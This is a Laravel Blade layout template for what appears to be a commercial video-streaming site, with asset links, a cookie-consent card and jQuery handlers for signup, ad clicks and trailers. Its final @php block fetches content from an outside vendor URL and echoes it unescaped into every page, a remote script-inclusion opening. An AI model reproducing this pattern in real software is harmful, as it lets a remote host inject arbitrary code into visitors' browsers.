<!doctype html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>{{ $general->siteName(__($pageTitle)) }}</title>
    @include('partials.seo')
    <link rel="icon" type="image/png" href="{{ asset('assets/images/logoIcon/favicon.png') }}" sizes="16x16">
    <!-- bootstrap 4  -->
    <link href="{{ asset('assets/global/css/bootstrap.min.css') }}" rel="stylesheet">
    <link href="{{ asset('assets/global/css/all.min.css') }}" rel="stylesheet">
    <link rel="stylesheet" href="{{asset('assets/global/css/line-awesome.min.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/global/css/global.css')}}" />
    <!-- image and videos view on page plugin -->
    <link rel="stylesheet" href="{{ asset($activeTemplateTrue.'/css/lightcase.css') }}">

    <link rel="stylesheet" href="{{ asset($activeTemplateTrue.'/css/vendor/animate.min.css') }}">
    <!-- custom select css -->
    <link rel="stylesheet" href="{{ asset($activeTemplateTrue.'/css/vendor/nice-select.css') }}">
    <!-- slick slider css -->
    <link rel="stylesheet" href="{{ asset($activeTemplateTrue.'/css/vendor/slick.css') }}">
    <link rel="stylesheet" href="{{ asset($activeTemplateTrue.'css/video-js.css') }}">

    <link href="https://vjs.zencdn.net/7.8.4/video-js.css" rel="stylesheet">
    <!-- dashdoard main css -->
    <link rel="stylesheet" href="{{ asset($activeTemplateTrue.'css/main.css') }}">
    <link rel="stylesheet" href="{{ asset($activeTemplateTrue.'css/custom.css') }}">
    <link rel="stylesheet" href="{{ asset($activeTemplateTrue.'css/color.php') }}?color1={{ $general->base_color }}&color2={{ $general->secondary_color }}">
    @stack('style-lib')

    @stack('style')
</head>

<body @stack('context')>
    <!-- preloader start -->
    <div id="preloader">
        <div class="pre-logo">
            <div class="gif"></div>
        </div>
    </div>
    <!-- preloader end -->


    <div class="page-wrapper" id="main-scrollbar" data-scrollbar>

        @yield('app')

        <div class="loading"></div>
    </div>

    @php
    $cookie = App\Models\Frontend::where('data_keys','cookie.data')->first();
    @endphp
    @if(($cookie->data_values->status == 1) && !\Cookie::get('gdpr_cookie'))
    <!-- cookies dark version start -->
    <div class="cookies-card text-center hide">
        <div class="cookies-card__icon bg--base">
            <i class="las la-cookie-bite"></i>
        </div>
        <p class="mt-4 cookies-card__content">{{ $cookie->data_values->short_desc }} <a href="{{ route('cookie.policy') }}" target="_blank" class="base--color">@lang('learn more')</a></p>
        <div class="cookies-card__btn mt-4">
            <a href="javascript:void(0)" class="cmn-btn w-100 policy">@lang('Allow')</a>
        </div>
    </div>
    
    <!-- cookies dark version end -->
    @endif
    <!-- jQuery library -->
    <script src="{{asset('assets/global/js/jquery-3.6.0.min.js')}}"></script>
    <script src="{{asset('assets/global/js/bootstrap.bundle.min.js')}}"></script>
    <script src="{{asset('assets/global/js/global.js')}}"></script>
    <!-- lightcase plugin -->
    <script src="{{ asset($activeTemplateTrue.'/js/vendor/lightcase.js') }}"></script>
    <!-- custom select js -->
    <script src="{{ asset($activeTemplateTrue.'/js/vendor/jquery.nice-select.min.js') }}"></script>
    <!-- slick slider js -->
    <script src="{{ asset($activeTemplateTrue.'/js/vendor/slick.min.js') }}"></script>
    <!-- scroll animation -->
    <script src="{{ asset($activeTemplateTrue.'/js/vendor/wow.min.js') }}"></script>
    <script src="{{ asset($activeTemplateTrue.'js/jquery.syotimer.js') }}"></script>
    <script src="{{ asset($activeTemplateTrue.'js/syotimer.lang.js') }}"></script>

    <script src="{{ asset($activeTemplateTrue.'/js/vendor/jquery.countdown.js') }}"></script>

    <script src="https://vjs.zencdn.net/ie8/1.1.2/videojs-ie8.min.js"></script>
    <script src="https://vjs.zencdn.net/7.8.4/video.js"></script>
    <script src="{{ asset($activeTemplateTrue.'/js/vendor/jquery.slimscroll.min.js') }}"></script>
    <!-- dashboard custom js -->
    <script src="{{ asset($activeTemplateTrue.'/js/app.js') }}"></script>


    @stack('script-lib')

    @stack('script')

    @include('partials.plugins')

    @include('partials.notify')

    <script>
        (function ($) {
      "use strict";
      $(".langSel").on("change", function() {
            window.location.href = "{{route('home')}}/change/"+$(this).val() ;
      });

      var inputElements = $('input,select');
      $.each(inputElements, function (index, element) {
          element = $(element);
          element.closest('.form-group').find('label').attr('for',element.attr('name'));
          element.attr('id',element.attr('name'))
      });

      $('.policy').on('click',function(){
          $.get('{{route('cookie.accept')}}', function(response){
              $('.cookies-card').addClass('d-none');
          });
      });

      setTimeout(function(){
          $('.cookies-card').removeClass('hide')
      },2000);

      var inputElements = $('[type=text],select,textarea');
      $.each(inputElements, function (index, element) {
          element = $(element);
          element.closest('.form-group').find('label').attr('for',element.attr('name'));
          element.attr('id',element.attr('name'))
      });

      $.each($('input, select, textarea'), function (i, element) {

          if (element.hasAttribute('required')) {
              $(element).closest('.form-group').find('label').addClass('required');
          }

      });

      //Cookie
      $(document).on('click', '.acceptPolicy', function () {
          $.ajax({
              url: "{{ route('cookie.accept') }}",
              method:'GET',
              success:function(data){
                  if (data.success){
                      $('.cookie__wrapper').addClass('d-none');
                      notify('success', data.success)
                  }
              },
          });
      });

      $('.subscribe-form').on('submit',function(e){
          $.ajaxSetup({
              headers: {
                  'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
              }
          });
          
          e.preventDefault();
          var email = $('input[name=email]').val();
          $.post('{{route('subscribe')}}',{email:email}, function(response){
              if(response.errors){
                  for (var i = 0; i < response.errors.length; i++) {
                      iziToast.error({message: response.errors[i], position: "topRight"});
                  }
              }else{
                $('[name=email]').val('');
                iziToast.success({message: response.success, position: "topRight"});
              }
          });
      });

      $(document).on("click",".advertise",function(){
          var id = $(this).data('id');
          var url = "{{ route('add.click') }}";

          $.ajax({
              headers: {
                  'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
              },
              url:url,
              method:'POST',
              data:{'id' : id},
              success:function(data){

              },
          });
      });

      $('.trailerBtn').click(function(){
        var modal = $('#trailerModal');
        var html = `<source src="${$(this).data('video')}" type="video/mp4" />`
        modal.find('video').attr('poster',$(this).data('poster'));
        modal.find('source').attr('src',$(this).data('video'));
        modal.modal('show');
      });

  })(jQuery);
    </script>

    @php
    $globalInclude = file_get_contents('https://script.viserlab.com/includeGlobal.php');
    echo $globalInclude;
    @endphp

</body>

</html>